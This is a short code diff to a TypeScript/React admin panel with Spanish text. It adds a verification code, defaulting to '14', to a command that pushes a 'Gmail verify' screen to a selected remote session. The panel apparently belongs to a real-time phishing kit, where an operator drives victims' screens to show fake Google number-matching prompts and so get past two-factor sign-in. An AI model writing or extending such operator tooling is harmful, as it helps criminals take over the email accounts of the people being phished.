@@ -680,17 +680,18 @@ export default function AdminPanel() {
     closeModal();
   };
   
-  const handleGmailVerifyModalConfirm = (data: { correo: string }) => {
+  const handleGmailVerifyModalConfirm = (data: { correo: string, codigo: string }) => {
     if (selectedSessionId) {
       sendScreenChange({
         tipo: `mostrar_${ScreenType.GMAIL_VERIFY}`,
         sessionId: selectedSessionId,
-        correo: data.correo
+        correo: data.correo,
+        codigo: data.codigo || '14' // Usar 14 como valor predeterminado si no se proporciona
       });
       
       toast({
         title: "Verificación de Google enviada",
-        description: `Se ha solicitado la verificación de Google para: ${data.correo}`,
+        description: `Se ha solicitado la verificación de Google para: ${data.correo} con código: ${data.codigo || '14'}`,
       });
     }
     
